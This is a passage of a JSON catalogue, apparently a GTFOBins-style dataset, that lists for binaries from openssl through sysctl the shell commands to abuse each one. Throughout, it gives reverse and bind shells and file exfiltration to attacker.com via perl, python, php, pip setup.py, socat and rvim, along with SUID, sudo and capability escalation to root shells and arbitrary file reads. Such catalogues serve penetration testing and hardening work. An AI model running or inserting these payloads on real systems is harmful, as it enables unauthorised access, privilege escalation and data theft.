      "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\""
    ]
  },
  "openssl": {
    "Reverse shell": [
      "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n",
      "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s"
    ],
    "File upload": [
      "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save\n",
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nopenssl s_client -quiet -connect $RHOST:$RPORT < \"$LFILE\""
    ],
    "File download": [
      "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send\n",
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nopenssl s_client -quiet -connect $RHOST:$RPORT > \"$LFILE\""
    ],
    "File write": [
      "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"",
      "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nopenssl enc -in \"$TF\" -out \"$LFILE\""
    ],
    "File read": [
      "LFILE=file_to_read\nopenssl enc -in \"$LFILE\""
    ],
    "Library load": [
      "openssl req -engine ./lib.so"
    ],
    "SUID": [
      "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n",
      "sudo sh -c 'cp $(which openssl) .; chmod +s ./openssl'\n\nRHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s",
      "sudo sh -c 'cp $(which openssl) .; chmod +s ./openssl'\n\nLFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\""
    ],
    "Sudo": [
      "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n",
      "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s"
    ]
  },
  "pdb": {
    "Shell": [
      "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\npdb $TF\ncont"
    ],
    "Sudo": [
      "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont"
    ]
  },
  "perl": {
    "Shell": [
      "perl -e 'exec \"/bin/sh\";'"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nperl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which perl) .; chmod +s ./perl'\n\n./perl -e 'exec \"/bin/sh\";'"
    ],
    "Sudo": [
      "sudo perl -e 'exec \"/bin/sh\";'"
    ],
    "Capabilities": [
      "cp $(which perl) .\nsudo setcap cap_setuid+ep perl\n\n./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
    ]
  },
  "pg": {
    "Shell": [
      "pg /etc/profile\n!/bin/sh"
    ],
    "File read": [
      "pg file_to_read"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which pg) .; chmod +s ./pg'\n\n./pg file_to_read"
    ],
    "Sudo": [
      "sudo pg /etc/profile\n!/bin/sh"
    ]
  },
  "php": {
    "Shell": [
      "export CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'",
      "export CMD=\"/bin/sh\"\nphp -r 'passthru(getenv(\"CMD\"));'",
      "export CMD=\"/bin/sh\"\nphp -r 'print(shell_exec(getenv(\"CMD\")));'",
      "export CMD=\"/bin/sh\"\nphp -r '$r=array(); exec(getenv(\"CMD\"), $r); print(join(\"\\\\n\",$r));'",
      "export CMD=\"/bin/sh\"\nphp -r '$h=@popen(getenv(\"CMD\"),\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'"
    ],
    "Command": [
      "export CMD=\"id\"\nphp -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(getenv(\"CMD\"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nphp -r '$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ],
    "File upload": [
      "LHOST=0.0.0.0\nLPORT=8888\nphp -S $LHOST:$LPORT"
    ],
    "File download": [
      "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nphp -r '$c=file_get_contents(getenv(\"URL\"));file_put_contents(getenv(\"LFILE\"), $c);'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which php) .; chmod +s ./php'\n\nCMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\""
    ],
    "Sudo": [
      "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\""
    ],
    "Capabilities": [
      "cp $(which php) .\nsudo setcap cap_setuid+ep php\n\nCMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\""
    ]
  },
  "pic": {
    "Shell": [
      "pic -U\n.PS\nsh X sh X"
    ],
    "Sudo": [
      "sudo pic -U\n.PS\nsh X sh X"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which pic) .; chmod +s ./pic'\n\n./pic -U\n.PS\nsh X sh X"
    ]
  },
  "pico": {
    "Shell": [
      "pico\n^R^X\nreset; sh 1>&0 2>&0",
      "pico -s /bin/sh\n/bin/sh\n^T"
    ],
    "File write": [
      "pico file_to_write\nDATA\n^O"
    ],
    "File read": [
      "pico file_to_read"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which pico) .; chmod +s ./pico'\n\n./pico\n^R^X\nreset; sh 1>&0 2>&0"
    ],
    "Sudo": [
      "sudo pico\n^R^X\nreset; sh 1>&0 2>&0"
    ]
  },
  "pip": {
    "Shell": [
      "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\npip install $TF"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\npip install $TF"
    ],
    "File upload": [
      "export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\npip install $TF",
      "export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\npip install $TF"
    ],
    "File download": [
      "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' > $TF/setup.py\npip install $TF"
    ],
    "File write": [
      "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"open('$LFILE','w+').write('DATA')\" > $TF/setup.py\npip install $TF"
    ],
    "File read": [
      "TF=$(mktemp -d)\necho 'raise Exception(open(\"file_to_read\").read())' > $TF/setup.py\npip install $TF"
    ],
    "Library load": [
      "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\npip install $TF"
    ],
    "Sudo": [
      "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF"
    ]
  },
  "pkexec": {
    "Sudo": [
      "sudo pkexec /bin/sh"
    ]
  },
  "pry": {
    "Shell": [
      "pry\nsystem(\"/bin/sh\")"
    ],
    "Sudo": [
      "sudo pry\nsystem(\"/bin/sh\")"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which pry) .; chmod +s ./pry'\n\n./pry\nsystem(\"/bin/sh\")"
    ]
  },
  "puppet": {
    "Shell": [
      "puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""
    ],
    "File write": [
      "LFILE=\"/tmp/file_to_write\"\npuppet apply -e \"file { '$LFILE': content => 'DATA' }\""
    ],
    "File read": [
      "LFILE=file_to_read\npuppet filebucket -l diff /dev/null $LFILE"
    ],
    "Sudo": [
      "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""
    ]
  },
  "python": {
    "Shell": [
      "python -c 'import os; os.system(\"/bin/sh\")'"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"
    ],
    "File upload": [
      "export URL=http://attacker.com/\nexport LFILE=file_to_send\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'",
      "export LPORT=8888\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'"
    ],
    "File download": [
      "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'"
    ],
    "File write": [
      "python -c 'open(\"file_to_write\",\"w+\").write(\"DATA\")'"
    ],
    "File read": [
      "python -c 'print(open(\"file_to_read\").read())'"
    ],
    "Library load": [
      "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which python) .; chmod +s ./python'\n\n./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
    ],
    "Sudo": [
      "sudo python -c 'import os; os.system(\"/bin/sh\")'"
    ],
    "Capabilities": [
      "cp $(which python) .\nsudo setcap cap_setuid+ep python\n\n./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
    ]
  },
  "rake": {
    "Shell": [
      "rake -p '`/bin/sh 1>&0`'"
    ],
    "Sudo": [
      "sudo rake -p '`/bin/sh 1>&0`'"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which rake) .; chmod +s ./rake'\n\n./rake -p '`/bin/sh 1>&0`'"
    ]
  },
  "readelf": {
    "File read": [
      "LFILE=file_to_read\nreadelf -a @$LFILE"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which readelf) .; chmod +s ./readelf'\n\nLFILE=file_to_read\n./readelf -a @$LFILE"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo readelf -a @$LFILE"
    ]
  },
  "red": {
    "File write": [
      "red file_to_write\na\nDATA\n.\nw\nq"
    ],
    "File read": [
      "red file_to_read\n,p\nq"
    ],
    "Sudo": [
      "sudo red file_to_write\na\nDATA\n.\nw\nq"
    ]
  },
  "redcarpet": {
    "File read": [
      "LFILE=file_to_read\nredcarpet \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo redcarpet \"$LFILE\""
    ]
  },
  "restic": {
    "File upload": [
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nrestic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which restic) .; chmod +s ./restic'\n\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
    ],
    "Sudo": [
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
    ]
  },
  "rlogin": {
    "File upload": [
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST"
    ]
  },
  "rlwrap": {
    "Shell": [
      "rlwrap /bin/sh"
    ],
    "File write": [
      "LFILE=file_to_write\nrlwrap -l \"$LFILE\" echo DATA"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which rlwrap) .; chmod +s ./rlwrap'\n\n./rlwrap -H /dev/null /bin/sh -p"
    ],
    "Sudo": [
      "sudo rlwrap /bin/sh"
    ]
  },
  "rpm": {
    "Shell": [
      "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which rpm) .; chmod +s ./rpm'\n\n./rpm --eval '%{lua:os.execute(\"/bin/sh\", \"-p\")}'"
    ],
    "Sudo": [
      "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
      "TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n",
      "sudo rpm -ivh x-1.0-1.noarch.rpm"
    ]
  },
  "rpmquery": {
    "Shell": [
      "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which rpmquery) .; chmod +s ./rpmquery'\n\n./rpmquery --eval '%{lua:posix.exec(\"/bin/sh\", \"-p\")}'"
    ],
    "Sudo": [
      "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
    ]
  },
  "rsync": {
    "Shell": [
      "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which rsync) .; chmod +s ./rsync'\n\n./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
    ],
    "Sudo": [
      "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
    ]
  },
  "ruby": {
    "Shell": [
      "ruby -e 'exec \"/bin/sh\"'"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
    ],
    "File upload": [
      "export LPORT=8888\nruby -run -e httpd . -p $LPORT"
    ],
    "File download": [
      "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'"
    ],
    "File write": [
      "ruby -e 'File.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }'"
    ],
    "File read": [
      "ruby -e 'puts File.read(\"file_to_read\")'"
    ],
    "Library load": [
      "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'"
    ],
    "Sudo": [
      "sudo ruby -e 'exec \"/bin/sh\"'"
    ],
    "Capabilities": [
      "cp $(which ruby) .\nsudo setcap cap_setuid+ep ruby\n\n./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
    ]
  },
  "run-mailcap": {
    "Shell": [
      "run-mailcap --action=view /etc/hosts\n!/bin/sh"
    ],
    "File write": [
      "run-mailcap --action=edit file_to_read"
    ],
    "File read": [
      "run-mailcap --action=view file_to_read"
    ],
    "Sudo": [
      "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh"
    ]
  },
  "run-parts": {
    "Shell": [
      "run-parts --new-session --regex '^sh$' /bin"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which run-parts) .; chmod +s ./run-parts'\n\n./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
    ],
    "Sudo": [
      "sudo run-parts --new-session --regex '^sh$' /bin"
    ]
  },
  "rvim": {
    "Shell": [
      "rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
      "rvim -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'"
    ],
    "Non-interactive reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
    ],
    "Non-interactive bind shell": [
      "export LPORT=12345\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
    ],
    "File upload": [
      "export URL=http://attacker.com/\nexport LFILE=file_to_send\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'",
      "export LPORT=8888\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'",
      "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'"
    ],
    "File download": [
      "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'",
      "export LPORT=12345\nexport LFILE=file_to_save\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'"
    ],
    "File write": [
      "rvim file_to_write\niDATA\n^[\nw"
    ],
    "File read": [
      "rvim file_to_read"
    ],
    "Library load": [
      "rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which rvim) .; chmod +s ./rvim'\n\n./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
    ],
    "Sudo": [
      "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
      "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "Capabilities": [
      "cp $(which rvim) .\nsudo setcap cap_setuid+ep rvim\n\n./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which rvim) .; chmod +s ./rvim'\n\n./rvim -c ':lua os.execute(\"reset; exec sh\")'"
    ]
  },
  "scp": {
    "Shell": [
      "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:"
    ],
    "File upload": [
      "RPATH=user@attacker.com:~/file_to_save\nLPATH=file_to_send\nscp $LFILE $RPATH"
    ],
    "File download": [
      "RPATH=user@attacker.com:~/file_to_get\nLFILE=file_to_save\nscp $RPATH $LFILE"
    ],
    "Sudo": [
      "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which scp) .; chmod +s ./scp'\n\nTF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:"
    ]
  },
  "screen": {
    "Shell": [
      "screen"
    ],
    "File write": [
      "LFILE=file_to_write\nscreen -L -Logfile $LFILE echo DATA",
      "LFILE=file_to_write\nscreen -L $LFILE echo DATA"
    ],
    "Sudo": [
      "sudo screen"
    ]
  },
  "script": {
    "Shell": [
      "script -q /dev/null"
    ],
    "File write": [
      "script -q -c 'echo DATA' file_to_write"
    ],
    "Sudo": [
      "sudo script -q /dev/null"
    ]
  },
  "sed": {
    "Shell": [
      "sed -n '1e exec sh 1>&0' /etc/hosts",
      "sed e"
    ],
    "Command": [
      "sed -n '1e id' /etc/hosts"
    ],
    "File write": [
      "LFILE=file_to_write\nsed -n \"1s/.*/DATA/w $LFILE\" /etc/hosts"
    ],
    "File read": [
      "LFILE=file_to_read\nsed '' \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which sed) .; chmod +s ./sed'\n\nLFILE=file_to_read\n./sed -e '' \"$LFILE\""
    ],
    "Sudo": [
      "sudo sed -n '1e exec sh 1>&0' /etc/hosts"
    ]
  },
  "service": {
    "Shell": [
      "/usr/sbin/service ../../bin/sh"
    ],
    "Sudo": [
      "sudo service ../../bin/sh"
    ]
  },
  "setarch": {
    "Shell": [
      "setarch $(arch) /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which setarch) .; chmod +s ./setarch'\n\n./setarch $(arch) /bin/sh -p"
    ],
    "Sudo": [
      "sudo setarch $(arch) /bin/sh"
    ]
  },
  "sftp": {
    "Shell": [
      "HOST=user@attacker.com\nsftp $HOST\n!/bin/sh"
    ],
    "File upload": [
      "RHOST=user@attacker.com\nsftp $RHOST\nput file_to_send file_to_save"
    ],
    "File download": [
      "RHOST=user@attacker.com\nsftp $RHOST\nget file_to_get file_to_save"
    ],
    "Sudo": [
      "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh"
    ]
  },
  "shuf": {
    "File write": [
      "LFILE=file_to_write\nshuf -e DATA -o \"$LFILE\""
    ],
    "File read": [
      "LFILE=file_to_read\nshuf -z \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which shuf) .; chmod +s ./shuf'\n\nLFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\""
    ]
  },
  "smbclient": {
    "Shell": [
      "smbclient '\\\\attacker\\share'\n!/bin/sh"
    ],
    "File upload": [
      "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'"
    ],
    "File download": [
      "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'"
    ],
    "Sudo": [
      "sudo smbclient '\\\\attacker\\share'\n!/bin/sh"
    ]
  },
  "socat": {
    "Shell": [
      "socat stdin exec:/bin/sh"
    ],
    "Reverse shell": [
      "RHOST=attacker.com\nRPORT=12345\nsocat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
    ],
    "Bind shell": [
      "LPORT=12345\nsocat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"
    ],
    "File upload": [
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nsocat -u file:$LFILE tcp-connect:$RHOST:$RPORT"
    ],
    "File download": [
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat"
    ],
    "Sudo": [
      "sudo socat stdin exec:/bin/sh"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which socat) .; chmod +s ./socat'\n\nRHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
    ]
  },
  "soelim": {
    "File read": [
      "LFILE=file_to_read\nsoelim \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which soelim) .; chmod +s ./soelim'\n\nLFILE=file_to_read\n./soelim \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo soelim \"$LFILE\""
    ]
  },
  "sort": {
    "File read": [
      "LFILE=file_to_read\nsort -m \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which sort) .; chmod +s ./sort'\n\nLFILE=file_to_read\n./sort -m \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo sort -m \"$LFILE\""
    ]
  },
  "sqlite3": {
    "Shell": [
      "sqlite3 /dev/null '.shell /bin/sh'"
    ],
    "File write": [
      "LFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'"
    ],
    "File read": [
      "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF"
    ],
    "Sudo": [
      "sudo sqlite3 /dev/null '.shell /bin/sh'"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which sqlite3) .; chmod +s ./sqlite3'\n\n./sqlite3 /dev/null '.shell /bin/sh'"
    ]
  },
  "ssh": {
    "Shell": [
      "ssh localhost $SHELL --noprofile --norc",
      "ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
    ],
    "File upload": [
      "HOST=user@attacker.com\nRPATH=file_to_save\nLPATH=file_to_send\nssh $HOST \"cat > $RPATH\" < $LPATH"
    ],
    "File download": [
      "HOST=user@attacker.com\nRPATH=file_to_get\nLPATH=file_to_save\nssh $HOST \"cat $RPATH\" > $LPATH"
    ],
    "File read": [
      "LFILE=file_to_read\nssh -F $LFILE localhost"
    ],
    "Sudo": [
      "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
    ]
  },
  "start-stop-daemon": {
    "Shell": [
      "start-stop-daemon -n $RANDOM -S -x /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which start-stop-daemon) .; chmod +s ./start-stop-daemon'\n\n./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
    ],
    "Sudo": [
      "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
    ]
  },
  "stdbuf": {
    "Shell": [
      "stdbuf -i0 /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which stdbuf) .; chmod +s ./stdbuf'\n\n./stdbuf -i0 /bin/sh -p"
    ],
    "Sudo": [
      "sudo stdbuf -i0 /bin/sh"
    ]
  },
  "strace": {
    "Shell": [
      "strace -o /dev/null /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which strace) .; chmod +s ./strace'\n\n./strace -o /dev/null /bin/sh -p"
    ],
    "Sudo": [
      "sudo strace -o /dev/null /bin/sh"
    ]
  },
  "strings": {
    "File read": [
      "LFILE=file_to_read\nstrings \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which strings) .; chmod +s ./strings'\n\nLFILE=file_to_read\n./strings \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo strings \"$LFILE\""
    ]
  },
  "su": {
    "Sudo": [
      "sudo su"
    ]
  },
  "sysctl": {
    "File read": [
      "LFILE=file_to_read\n/usr/sbin/sysctl -n \"/../../$LFILE\""
    ],
    "SUID": [
